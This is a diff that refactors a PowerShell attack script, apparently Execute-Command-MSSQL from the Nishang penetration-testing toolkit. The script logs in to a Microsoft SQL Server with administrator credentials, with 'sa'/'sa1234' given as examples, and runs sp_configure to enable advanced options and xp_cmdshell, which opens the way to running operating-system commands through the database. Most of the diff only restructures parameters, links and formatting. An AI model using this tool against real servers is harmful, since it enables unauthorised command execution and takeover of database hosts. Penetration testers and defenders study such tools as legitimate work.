@@ -17,14 +17,14 @@ Enter a UserName for a SQL server administrator account.
 Enter the Password for the account.
 
 .EXAMPLE
-PS> .\Execute-Command-MSSQL.ps1 -ComputerName sqlserv01 -UserName sa -Password sa1234
+PS> Execute-Command-MSSQL -ComputerName sqlserv01 -UserName sa -Password sa1234
 
 .EXAMPLE
-PS> .\Execute-Command-MSSQL.ps1 -ComputerName 192.168.1.10 -UserName sa -Password sa1234
+PS> Execute-Command-MSSQL -ComputerName 192.168.1.10 -UserName sa -Password sa1234
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://www.labofapenetrationtester.com/2012/12/command-execution-on-ms-sql-server-using-powershell.html
+https://github.com/samratashok/nishang
 
 .NOTES
 Based mostly on the Get-TSSqlSysLogin by Niklas Goude and accompanying blog post at 
@@ -35,31 +35,40 @@ http://www.truesec.com
 
 
 
-  Param(
-    [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
-    [Alias("PSComputerName","CN","MachineName","IP","IPAddress")][string]$ComputerName,
-    [parameter(Mandatory = $true, Position = 1)][string]$UserName,
-    [parameter(Mandatory = $true, Position = 2)][string]$Password
-    )
+
   
   function Execute-Command-MSSQL {
-  
-  Try{
-    function Make-Connection ($query){
- 
-    $Connection = New-Object System.Data.SQLClient.SQLConnection
-    $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
-    $Connection.Open()
-    $Command = New-Object System.Data.SQLClient.SQLCommand
-    $Command.Connection = $Connection
-    $Command.CommandText = $query
-    $Reader = $Command.ExecuteReader()
-    $Connection.Close()
 
+    [CmdletBinding()] Param(
+        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
+        [Alias("PSComputerName","CN","MachineName","IP","IPAddress")]
+        [string]
+        $ComputerName,
+
+        [parameter(Mandatory = $true, Position = 1)]
+        [string]
+        $UserName,
+    
+        [parameter(Mandatory = $true, Position = 2)]
+        [string]
+        $Password
+    )
+  
+    Try{
+    function Make-Connection ($query)
+    {
+        $Connection = New-Object System.Data.SQLClient.SQLConnection
+        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
+        $Connection.Open()
+        $Command = New-Object System.Data.SQLClient.SQLCommand
+        $Command.Connection = $Connection
+        $Command.CommandText = $query
+        $Reader = $Command.ExecuteReader()
+        $Connection.Close()
     }
   
     "Connecting to $ComputerName..." 
-	start-sleep 3 
+    start-sleep 3 
     Make-Connection "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
     "`nEnabling XP_CMDSHELL...`n"
     start-sleep 3
@@ -107,8 +116,7 @@ http://www.truesec.com
     }
     }
     Catch {
-      $error[0]
+        $error[0]
     }
 }
 
-Execute-Command-MSSQL
